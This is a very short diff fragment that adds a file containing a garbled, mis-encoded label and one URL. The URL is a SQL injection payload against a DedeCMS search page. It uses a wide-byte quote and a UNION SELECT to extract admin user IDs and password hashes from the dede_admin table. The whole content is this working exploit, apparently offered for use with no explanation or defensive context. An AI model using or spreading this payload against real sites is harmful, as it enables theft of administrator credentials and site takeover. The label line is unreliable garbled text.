@@ -1,0 +1,5 @@
+
+¿˚”√µÿ÷∑:
+http://localhost/plus/infosearch.php?action=search&q=%cf'%20union%20select%201,2,userid,4,pwd,6%20from%20dede_admin/*
+
+
